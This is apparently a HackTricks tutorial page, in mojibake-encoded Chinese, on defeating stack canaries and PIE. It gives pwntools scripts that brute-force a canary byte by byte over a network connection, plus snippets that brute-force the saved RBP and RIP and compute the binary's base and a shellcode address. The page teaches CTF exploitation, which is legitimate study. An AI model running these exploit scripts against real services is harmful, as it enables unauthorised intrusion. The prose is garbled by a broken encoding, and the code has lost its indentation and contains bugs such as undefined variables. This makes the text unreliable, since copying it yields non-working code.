<details>

<summary><strong>é›¶åŸºç¡€å­¦ä¹  AWS é»‘å®¢æ”»å‡»åˆ°é«˜æ‰‹</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ **HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ HackTricks çš„ PDF ç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢ [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFT é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š **å…³æ³¨** æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>


**å¦‚æœæ‚¨é¢å¯¹çš„æ˜¯ä¸€ä¸ªå—åˆ° canary å’Œ PIE (ä½ç½®ç‹¬ç«‹å¯æ‰§è¡Œæ–‡ä»¶) ä¿æŠ¤çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ‚¨å¯èƒ½éœ€è¦æ‰¾åˆ°ç»•è¿‡å®ƒä»¬çš„æ–¹æ³•ã€‚**

![](<../../.gitbook/assets/image (144).png>)

{% hint style="info" %}
è¯·æ³¨æ„ï¼Œå¦‚æœäºŒè¿›åˆ¶æ–‡ä»¶æ˜¯é™æ€ç¼–è¯‘çš„ï¼Œå¹¶ä¸”æ— æ³•è¯†åˆ«è¯¥å‡½æ•°ï¼Œ**`checksec`** å¯èƒ½æ— æ³•å‘ç°äºŒè¿›åˆ¶æ–‡ä»¶å—åˆ° canary çš„ä¿æŠ¤ã€‚\
ç„¶è€Œï¼Œå¦‚æœæ‚¨å‘ç°åœ¨å‡½æ•°è°ƒç”¨å¼€å§‹æ—¶æœ‰ä¸€ä¸ªå€¼è¢«ä¿å­˜åœ¨æ ˆä¸­ï¼Œå¹¶ä¸”åœ¨é€€å‡ºå‰æ£€æŸ¥äº†è¿™ä¸ªå€¼ï¼Œæ‚¨å¯ä»¥æ‰‹åŠ¨æ³¨æ„åˆ°è¿™ä¸€ç‚¹ã€‚
{% endhint %}

# æš´åŠ›ç ´è§£ Canary

ç»•è¿‡ç®€å• canary çš„æœ€ä½³æ–¹æ³•æ˜¯ï¼Œå¦‚æœäºŒè¿›åˆ¶æ–‡ä»¶æ˜¯ä¸€ä¸ª**æ¯æ¬¡æ‚¨å»ºç«‹æ–°è¿æ¥æ—¶éƒ½ä¼š fork å­è¿›ç¨‹çš„ç¨‹åº**ï¼ˆç½‘ç»œæœåŠ¡ï¼‰ï¼Œå› ä¸ºæ¯æ¬¡æ‚¨è¿æ¥åˆ°å®ƒæ—¶**éƒ½ä¼šä½¿ç”¨ç›¸åŒçš„ canary**ã€‚

é‚£ä¹ˆï¼Œç»•è¿‡ canary çš„æœ€ä½³æ–¹æ³•å°±æ˜¯**é€ä¸ªå­—ç¬¦åœ°æš´åŠ›ç ´è§£**ï¼Œæ‚¨å¯ä»¥é€šè¿‡æ£€æŸ¥ç¨‹åºæ˜¯å¦å´©æºƒæˆ–ç»§ç»­å…¶æ­£å¸¸æµç¨‹æ¥åˆ¤æ–­çŒœæµ‹çš„ canary å­—èŠ‚æ˜¯å¦æ­£ç¡®ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå‡½æ•°**æš´åŠ›ç ´è§£ä¸€ä¸ª 8 å­—èŠ‚çš„ canary (x64)** å¹¶ä¸”ä»…é€šè¿‡**æ£€æŸ¥**æœåŠ¡å™¨æ˜¯å¦å‘å›äº†**å“åº”**æ¥åŒºåˆ†æ­£ç¡®çŒœæµ‹çš„å­—èŠ‚å’Œé”™è¯¯çš„å­—èŠ‚ï¼ˆåœ¨**å…¶ä»–æƒ…å†µ**ä¸‹çš„å¦ä¸€ç§æ–¹æ³•å¯èƒ½æ˜¯ä½¿ç”¨ **try/except**ï¼‰ï¼š

## ç¤ºä¾‹ 1

æ­¤ç¤ºä¾‹ä¸º 64 ä½å®ç°ï¼Œä½†ä¹Ÿå¯ä»¥è½»æ¾å®ç°ä¸º 32 ä½ã€‚
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```
## ç¤ºä¾‹ 2

è¿™æ˜¯ä¸º32ä½å®ç°çš„ï¼Œä½†å¯ä»¥è½»æ¾æ›´æ”¹ä¸º64ä½ã€‚\
å¦è¯·æ³¨æ„ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ**ç¨‹åºé¦–å…ˆæœŸæœ›ä¸€ä¸ªå­—èŠ‚æ¥æŒ‡ç¤ºè¾“å…¥çš„å¤§å°**ä»¥åŠæœ‰æ•ˆè½½è·ã€‚
```python
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
known_canary = b""
test_canary = 0x0
len_bytes_to_read = 0x21

for j in range(0, 4):
# Iterate up to 0xff times to brute force all posible values for byte
for test_canary in range(0xff):
print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")

# Send the current input size
target.send(len_bytes_to_read.to_bytes(1, "little"))

# Send this iterations canary
target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little"))

# Scan in the output, determine if we have a correct value
output = target.recvuntil(b"exit.")
if b"YUM" in output:
# If we have a correct value, record the canary value, reset the canary value, and move on
print(" - next byte is: " + hex(test_canary))
known_canary = known_canary + test_canary.to_bytes(1, "little")
len_bytes_to_read += 1
break

# Return the canary
return known_canary

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
```
# æ‰“å° Canary

å¦ä¸€ç§ç»•è¿‡ canary çš„æ–¹æ³•æ˜¯**æ‰“å°å®ƒ**ã€‚\
æƒ³è±¡ä¸€ç§æƒ…å†µï¼Œä¸€ä¸ª**ç¨‹åºå­˜åœ¨**æ ˆæº¢å‡ºæ¼æ´ï¼Œå¯ä»¥æ‰§è¡Œä¸€ä¸ª**æŒ‡å‘**æ ˆæº¢å‡º**éƒ¨åˆ†**çš„ **puts** å‡½æ•°ã€‚æ”»å‡»è€…çŸ¥é“ canary çš„**ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯ç©ºå­—èŠ‚**ï¼ˆ`\x00`ï¼‰ï¼Œå…¶ä½™çš„ canary æ˜¯**éšæœº**å­—èŠ‚ã€‚ç„¶åï¼Œæ”»å‡»è€…å¯èƒ½åˆ›å»ºä¸€ä¸ªæº¢å‡ºï¼Œ**åªè¦†ç›– canary çš„ç¬¬ä¸€ä¸ªå­—èŠ‚**ã€‚\
æ¥ç€ï¼Œæ”»å‡»è€…**è°ƒç”¨ puts åŠŸèƒ½**åœ¨è½½è·çš„ä¸­é—´éƒ¨åˆ†ï¼Œè¿™å°†**æ‰“å°å‡ºæ‰€æœ‰çš„ canary**ï¼ˆé™¤äº†ç¬¬ä¸€ä¸ªç©ºå­—èŠ‚ï¼‰ã€‚\
æœ‰äº†è¿™ä¸ªä¿¡æ¯ï¼Œæ”»å‡»è€…å¯ä»¥**æ„é€ å¹¶å‘é€ä¸€ä¸ªæ–°çš„æ”»å‡»**ï¼ŒçŸ¥é“äº† canaryï¼ˆåœ¨åŒä¸€ä¸ªç¨‹åºä¼šè¯ä¸­ï¼‰

æ˜¾ç„¶ï¼Œè¿™ç§ç­–ç•¥éå¸¸**å—é™**ï¼Œå› ä¸ºæ”»å‡»è€…éœ€è¦èƒ½å¤Ÿ**æ‰“å°**ä»–çš„**è½½è·å†…å®¹**æ¥**æ³„éœ²** canaryï¼Œç„¶åèƒ½å¤Ÿåˆ›å»ºä¸€ä¸ªæ–°çš„è½½è·ï¼ˆåœ¨**åŒä¸€ä¸ªç¨‹åºä¼šè¯ä¸­**ï¼‰å¹¶**å‘é€**çœŸæ­£çš„**ç¼“å†²åŒºæº¢å‡º**ã€‚\
CTF ç¤ºä¾‹: [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)

# PIE

ä¸ºäº†ç»•è¿‡ PIEï¼Œä½ éœ€è¦**æ³„éœ²æŸä¸ªåœ°å€**ã€‚å¦‚æœäºŒè¿›åˆ¶æ–‡ä»¶æ²¡æœ‰æ³„éœ²ä»»ä½•åœ°å€ï¼Œæœ€å¥½çš„æ–¹æ³•æ˜¯**æš´åŠ›ç ´è§£æ ˆä¸­ä¿å­˜çš„ RBP å’Œ RIP**ã€‚\
ä¾‹å¦‚ï¼Œå¦‚æœä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶åŒæ—¶ä½¿ç”¨äº†**canary**å’Œ**PIE**ä¿æŠ¤ï¼Œä½ å¯ä»¥å¼€å§‹æš´åŠ›ç ´è§£ canaryï¼Œç„¶åæ¥ä¸‹æ¥çš„ 8 å­—èŠ‚ï¼ˆx64ï¼‰å°†æ˜¯ä¿å­˜çš„**RBP**ï¼Œå†æ¥ä¸‹æ¥çš„ 8 å­—èŠ‚å°†æ˜¯ä¿å­˜çš„**RIP**ã€‚

è¦ä»äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æš´åŠ›ç ´è§£ RBP å’Œ RIPï¼Œä½ å¯ä»¥å‘ç°ï¼Œå¦‚æœç¨‹åºè¾“å‡ºäº†æŸäº›å†…å®¹æˆ–è€…å®ƒæ²¡æœ‰å´©æºƒï¼Œé‚£ä¹ˆä¸€ä¸ªçŒœæµ‹æ­£ç¡®çš„æœ‰æ•ˆå­—èŠ‚å°±æ˜¯æ­£ç¡®çš„ã€‚ç”¨äºæš´åŠ›ç ´è§£ canary çš„**ç›¸åŒå‡½æ•°**ä¹Ÿå¯ä»¥ç”¨æ¥æš´åŠ›ç ´è§£ RBP å’Œ RIPï¼š
```python
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
## è·å–åŸºåœ°å€

è¦å‡»è´¥ PIEï¼Œæ‚¨éœ€è¦ä»æ³„éœ²çš„åœ°å€è®¡ç®—**æœ‰ç”¨çš„åœ°å€**ï¼š**RBP** å’Œ **RIP**ã€‚

ä» **RBP**ï¼Œæ‚¨å¯ä»¥è®¡ç®—**åœ¨æ ˆä¸­å†™å…¥ shell çš„ä½ç½®**ã€‚è¿™å¯¹äºçŸ¥é“æ‚¨å°†åœ¨æ ˆä¸­çš„å“ªä¸ªä½ç½®å†™å…¥å­—ç¬¦ä¸² _"/bin/sh\x00"_ éå¸¸æœ‰ç”¨ã€‚è¦è®¡ç®—æ³„éœ²çš„ RBP ä¸æ‚¨çš„ shellcode ä¹‹é—´çš„è·ç¦»ï¼Œæ‚¨å¯ä»¥åœ¨æ³„éœ² RBP åè®¾ç½®ä¸€ä¸ª**æ–­ç‚¹**ï¼Œæ£€æŸ¥**æ‚¨çš„ shellcode ä½äºä½•å¤„**ï¼Œç„¶åï¼Œæ‚¨å¯ä»¥è®¡ç®— shellcode ä¸ RBP ä¹‹é—´çš„è·ç¦»ï¼š
```python
INI_SHELLCODE = RBP - 1152
```
ä» **RIP** å¯ä»¥è®¡ç®—å‡º **PIE äºŒè¿›åˆ¶æ–‡ä»¶çš„åŸºåœ°å€**ï¼Œè¿™æ˜¯åˆ›å»º **æœ‰æ•ˆ ROP é“¾** æ‰€éœ€çš„ã€‚\
è¦è®¡ç®—åŸºåœ°å€ï¼Œåªéœ€æ‰§è¡Œ `objdump -d vunbinary` å¹¶æ£€æŸ¥åæ±‡ç¼–çš„æœ€æ–°åœ°å€ï¼š

![](<../../.gitbook/assets/image (145).png>)

åœ¨è¯¥ç¤ºä¾‹ä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°åªéœ€è¦ **1ä¸ªå­—èŠ‚å’ŒåŠä¸ªå­—èŠ‚** å°±å¯ä»¥å®šä½æ‰€æœ‰ä»£ç ï¼Œå› æ­¤ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒåŸºåœ°å€å°†æ˜¯ **æ³„éœ²çš„ RIP ä½†ä»¥ "000" ç»“å°¾**ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨æ³„éœ²äº† _0x562002970**ecf**_ ï¼Œé‚£ä¹ˆåŸºåœ°å€å°±æ˜¯ _0x562002970**000**_
```python
elf.address = RIP - (RIP & 0xfff)
```
<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼:

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å– [**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š **å…³æ³¨** æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
